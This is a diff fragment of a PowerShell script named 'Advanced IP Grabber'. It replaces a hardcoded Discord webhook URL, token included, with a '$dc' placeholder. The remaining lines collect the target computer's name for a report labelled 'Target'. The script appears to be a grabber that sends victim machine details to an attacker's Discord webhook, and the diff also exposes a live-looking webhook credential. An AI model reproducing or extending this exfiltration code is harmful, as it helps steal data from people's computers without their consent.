@@ -1,4 +1,4 @@
-$webHookUrl='https://discord.com/api/webhooks/1060451832108949596/-doca_q-YfvU_TZ1feEwZ3QuatUBCPnaQx1UW95kVkQ3_7QpmiidEzXoceBJ6oHr-KCZ'
+$webHookUrl='$dc'
 $title = "Advanced IP Grabber"
 $targetPC = (Get-WmiObject -class Win32_ComputerSystem).Name
 $description = "Target: **$targetPC**"
